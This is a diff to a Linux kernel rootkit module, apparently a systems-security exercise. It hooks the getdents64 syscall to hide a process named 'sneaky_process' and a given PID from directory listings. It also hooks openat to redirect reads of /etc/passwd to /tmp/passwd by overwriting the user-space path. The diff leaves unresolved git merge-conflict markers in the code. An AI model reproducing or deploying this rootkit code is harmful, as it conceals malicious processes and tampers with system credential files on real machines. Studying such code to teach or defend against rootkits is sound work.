@@ -58,8 +58,9 @@ asmlinkage int sneaky_sys_getdents64(struct pt_regs *regs)
   ssize_t bpos;
   nread = original_getdents64(regs);
   for(bpos=0;bpos<nread;){
-    d = (struct linux_dirent64 *)((char *)dirptr + bpos);
-    if (strcmp(d->d_name, "sneaky_process") == 0){
+    d = (struct linux_dirent64 *)((char *)regs->si + bpos);
+    if (strcmp(d->d_name, "sneaky_process") == 0 ||
+        strcmp(d->d_name, pid) == 0){
       int current_size = d->d_reclen;
       int rest = ((char*)regs->si+nread) - ((char*)d+current_size);
       void* source = (char*)d + current_size;
@@ -98,7 +99,15 @@ asmlinkage int (*original_openat)(struct pt_regs *regs);
 asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
 {
   // Implement the sneaky part here
+  if (strcmp((const char *)(regs -> si), "/etc/passwd") == 0) {
+    char newPath[] = "/tmp/passwd";
+    copy_to_user((void *)(regs -> si), newPath,strlen(newPath)); 
+  }
+<<<<<<< HEAD
+  
+=======
 
+>>>>>>> e9bf799f98155b2d17248c56ecff3ba2ed943759
   return (*original_openat)(regs);
 }
 
